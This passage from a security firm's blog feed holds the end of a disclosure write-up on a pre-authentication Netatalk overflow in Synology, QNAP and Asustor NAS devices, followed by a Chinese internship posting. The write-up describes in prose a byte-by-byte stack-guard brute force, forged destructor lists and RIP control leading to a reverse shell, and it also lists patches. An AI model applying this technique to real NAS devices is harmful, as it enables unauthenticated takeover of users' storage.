&lt;p&gt;We can use the overflow vulnerability to overwrite only the last byte of stack guard on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thread Local Storage&lt;/code&gt; with different value in each different connection. Once the value is different from the original value, the service disconnects. Therefore, we can use the behavior to validate whether the value we overwritten is the same as stack guard. After the lowest byte is determined, we can continue to add another byte, and so on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above figure, we assume that the stack guard is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;. Due to the stack guard feature in Linux, the lowest byte must be 0. Let‚Äôs start with the second byte. We can overwrite with 0x00 to see if the connection is disconnected first. If it is disconnected, it means the value we overwrote is wrong. Next, we will test other values to see if the connection is disconnected. And so on, until there is no disconnection, we can find the correct value of section bytes. Then we can try to overwrite third byte, fourth byte and so on. After the stack guard is overwritten with 8 bytes and the connection is not disconnected, we can successfully bypass the stack guard.&lt;/p&gt;

&lt;p&gt;After we leak the stack guard, we can actually control RIP successfully. 
Next, we need to forge the structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP.&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

&lt;p&gt;In DSM 6.2.3-25426, Because it does not enable PIE, we can forge &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the data section of afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luckily, when netatalk use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhx2 login&lt;/code&gt; authentication, it will copy the username we provided to the data section of afpd. We can use the feature to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; on the known address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After everything is constructed, we can trigger the normal function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; to control the RIP.&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in the glibc-2.20 in DSM 6.2.3-25426, it will invoke  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr&lt;/code&gt; to get the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;. The function will take the variable from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt;. We also need to construct it on a known address.&lt;/p&gt;

&lt;p&gt;The final structure we forged is as follows&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we control RIP to invoke execl() in afpd to get the reverse shell.&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;
&lt;p&gt;In general Netatalk, PIE protection is enabled by default. It is difficult to construct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; in a known address. In fact, you can also leak libc address using a similar method. It is still exploitable.&lt;/p&gt;

&lt;p&gt;This vulnerability not only affects Synology, but also affects some devices use Netatalk.&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;We tested several vendors using Netatalk and found that most device have similar problems, some are unexploitable but some are exploitable. We have tested QNAP and Asustor here, and both have successfully obtained the shell.&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Built-in system function&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is worth mentioning that both QNAP and Asustor NAS does not enabled stack guard, and you can get the reverse shell without brute-force.&lt;/p&gt;

&lt;p&gt;When Synology has not yet patched this vulnerability, it can be exploited as long as the default is installed. &lt;strong&gt;No authentication is required&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Although QNAP and Asustor are not enabled by default, many users who use Macs still turn it on for convenience. Actually, Netatalk will be used almost in NAS. Most NAS will have an impact, as long as they enable Netatalk, an attacker can use this vulnerability to take over most of the NAS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Your NAS is not your NAS !&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, many people open Netatalk on the external network. There are 130,000 machines on shodan alone, most of which are Synology.&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;At present, the above three have been patched, please update to the latest version.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This vulnerability is also fixed in the recently released &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt;. If you use a version before Netatalk 3.1.13, you also need to update to the latest version.&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;It‚Äôs best to disable it directly. The project is rarely maintained, and the risk of continuing to use it is extremely high.&lt;/li&gt;
  &lt;li&gt;SMB is &lt;strong&gt;relatively safe&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;If you want to use similar feature, it is recommended to use SMB. It is relatively safe, but it can only be said to be relatively safe.&lt;/li&gt;
      &lt;li&gt;It is recommended that all related services should be opened in the intranet.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;We have successfully found a serious vulnerability in the NAS, and successfully wrote a proof-of-concept, which proved that it can be exploited on many NAS such as Synology, QNAP and Asustor.&lt;/p&gt;

&lt;p&gt;We also think that Netatalk is a new generation of backdoor in NAS!&lt;/p&gt;

&lt;p&gt;In the future, We hope that NAS vendor who use third-party can re-examine the security issues caused by them. It is strongly recommended that NAS vendor can review it by themselves and pay attention to whether other vendor have also fixed the vulnerabilities in the same third-party. It is possible that it will also be affected.&lt;/p&gt;

&lt;p&gt;The users who want to use NAS can also pay more attention to not opening the NAS on the external network and unused services should be disabled as much as possible to reduce the attack surface.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;In fact, we have not only found one vulnerability, we have also found that there are still many problems. In next part, we will publish more research after most vendor fix it.&lt;/p&gt;

&lt;p&gt;Please look forward to Part II.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS-en</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[Â∑≤ÁµêÊùü] DEVCORE 2022 ÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE Ëá™ 2012 ÊàêÁ´ã‰ª•‰æÜÂ∑≤ÈÇÅÂêëÁ¨¨ÂçÅÂπ¥ÔºåÊàëÂÄëÂæàÈáçË¶ñÂè∞ÁÅ£ÁöÑË≥áÂÆâÔºå‰πüÂ∞àÊ≥®ÊâæÂá∫ÊúÄÂö¥ÈáçÁöÑÂº±Èªû‰ª•‰øùË≠∑‰∏ñÁïå„ÄÇÈõñÁÑ∂ÂÖ¨Âè∏Ë¶èÊ®°Êì¥Âºµ‰∏çÂø´Ôºå‰ΩÜÂú®Êº∏Êº∏Á´ôÁ©©ËÖ≥Ê≠•ÁöÑÂêåÊôÇÔºåÊàëÂÄë‰ªç‰∏çÂøòÂàùË°∑ÔºöÂæû 2020 ÈñãÂßãÂú®ËºîÂ§ß„ÄÅÂè∞ÁßëÂ§ßÊàêÁ´ãË≥áÂÆâÁçéÂ≠∏ÈáëÔºõÂú® 2021 Âπ¥Êú´Êì¥Â§ß&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;ÂæµÊâç&lt;/a&gt;ÔºåÊÉ≥ÊâæÂ∞ãÊúâËëóÁõ∏ÂêåÁêÜÂøµÁöÑ‰∫∫Êâç‰∏ÄËµ∑Â•ÆÈ¨•ÔºõËÄåÁèæÂú®ÔºåÊàëÂÄëÈñãÂßãÂòóË©¶ËàâËæ¶ÂØ¶ÁøíÁîüË®àÁï´ÔºåÂ∏åÊúõÂüπËÇ≤‰∫∫Êâç„ÄÅÂ¢ûÂº∑Êñ∞‰∏ñ‰ª£ÁöÑË≥áÂÆâÊäÄËÉΩÔºåÂ¶ÇÊûúÊÇ®Â∞çÈÄôÂÄãË®àÁï´ÊúâËààË∂£ÔºåÊ≠°Ëøé‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Binary Âèä Web ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 70 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
‰∏ªË¶ÅÂÖßÂÆπÁÇ∫Âú®Â∞éÂ∏´ÊåáÂºïËàáËºî‰Ωê‰∏ãÁ†îÁ©∂ÈÅéÂæÄÊºèÊ¥ûËàáËøëÂπ¥Â∏∏Ë¶ãÊñ∞ÂûãÊÖãÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ïÔºåÈúÄË¶ÅË£Ω‰ΩúÊäïÂΩ±Áâá‰ªãÁ¥πÊàêÊûú‰∏¶Âª∫ÁΩÆÂèØ‰æõ‰ªñ‰∫∫ÈáçÁèæÂº±ÈªûÁöÑÊ®°Êì¨Ê∏¨Ë©¶Áí∞Â¢É (Lab)ÔºåÂè¶ÂèØËÉΩÈúÄË¶ÅÊí∞ÂØ´Êàñ‰øÆÊîπÂèØÂà©Áî®ÊîªÊìäÁ®ãÂºèÈÄ≤Ë°åÂº±ÈªûÈ©óË≠â„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÂèäÊîªÊìäÊâãÊ≥ïÁ†îÁ©∂ 70%&lt;/li&gt;
      &lt;li&gt;Âª∫ÁΩÆ Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 Âπ¥ 4 ÊúàÈñãÂßãÂà∞ 7 ÊúàÂ∫ïÔºåÂÖ± 4 ÂÄãÊúà„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶&lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;p&gt;Â§ßÂ∞àÈô¢Ê†°Â§ß‰∏âÔºàÂê´Ôºâ‰ª•‰∏äÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏Áîü&lt;/p&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary ÁµÑÔºö2 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Web ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÈÄÜÂêëÂ∑•Á®ãÂèäÈô§ÈåØËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;ËÉΩÁúãÊáÇÁµÑÂêàË™ûË®Ä‰∏¶Áû≠Ëß£Âü∫Êú¨ Debugger ‰ΩøÁî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;È†àÁü•ÈÅì ROP„ÄÅHeap Exploitation Á≠âÁõ∏ÈóúÂà©Áî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ Scripting Language ÈñãÁôºËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;Python„ÄÅRuby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂàÜÊûêÂ§ßÂûã Open Source Â∞àÊ°àËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;‰ª• C/C++ ÁÇ∫‰∏ª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Á§é‰ΩúÊ•≠Á≥ªÁµ±Áü•Ë≠ò
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÁü•ÈÅì Virtual Address Ëàá Physical Address ÁöÑÊ¶ÇÂøµ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;Áü•ÈÅìÊÄéÊ®£ÂØ´ÁöÑÁ®ãÂºèÁ¢ºÊúÉÊúâÂïèÈ°å
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;‚Ä¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜÈùûÂøÖË¶ÅÊ¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide Êàñ Write-ups&lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÊúâÂØ´ÈÅé 1-day Âà©Áî®Á®ãÂºè&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ PortSwigger Web Security Academy ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËÄÉÈÄ£ÁµêÔºöhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúÔºåÂåÖÂê´ Unix-like Âíå Windows ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂ∏∏Ë¶ãÊàñÂÖßÂª∫Á≥ªÁµ±Êåá‰ª§Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApacheÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinuxÔºâÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôËøΩÊ†πÁ©∂Êü¢ÁöÑÁ≤æÁ•û„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜÈùûÂøÖË¶ÅÊ¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day exploit„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∏âÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Êõ∏Èù¢ÂØ©Êü•&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÊ∏¨È©óÔºà2 È°åÔºåË©≥Ë¶ã‰∏ãÊñπ&lt;a href=&quot;/blog/2022/01/27/intern-recruit/#:~:text=Á∞°Á≠îÈ°åÈ°åÁõÆ&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/a&gt;Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÁ∞°Á≠îÈ°åÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊàëÂÄëÊúÉÂú®‰∏ÉÂÄãÂ∑•‰ΩúÂ§©ÂÖßÂõûË¶ÜÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºå‰∏¶‰∏îË¶ñÊÉÖÊ≥ÅÈôÑ‰∏äÁ¨¨‰∫åÈöéÊÆµÁöÑÈ°åÁõÆ„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµËÉΩÂäõÊ∏¨È©ó&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöËÉΩÂäõÊ∏¨È©ó&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;Á¨¨‰∫åÈöéÊÆµÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÊàñÊòØ‰ªª‰ΩïÂèØ‰ª•Ë≠âÊòéÂÖ∑ÂÇô Binary Exploit Áõ∏ÈóúÊäÄËÉΩÁöÑË≥áÊñô‰æÜÊ±∫ÂÆöÊòØÂê¶ÈúÄË¶ÅÂè¶Â§ñÂÅöÈ°åÁõÆÔºåÂ¶ÇÊûúÊú™ÈÅîÊ®ôÊ∫ñÂâáÊúÉÂè¶Â§ñÊ∫ñÂÇô Binary Exploitation Áõ∏ÈóúÈ°åÁõÆÔºåÂéüÂâá‰∏äÈÄôÂÄãÈöéÊÆµÊúÉÁµ¶Â§ßÂÆ∂Á¥ÑÂÖ©ÈÄ±ÊôÇÈñìËß£È°åÔºåËß£ÂÆåÂæåË´ãÂãôÂøÖÂØ´‰∏ãËß£È°åÈÅéÁ®ãÔºàWrite-upÔºâÔºåÂæÖÊàëÂÄëÊî∂Âà∞Ëß£È°åÈÅéÁ®ãÂæåÔºåÂ∞áÊúÉÊ†πÊìöÊÇ®ÁöÑÁãÄÊ≥ÅÊ±∫ÂÆöÊòØÂê¶ÂèØ‰ª•ÈÄ≤ÂÖ•Á¨¨‰∏âÈöéÊÆµ„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;ÁÑ°&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

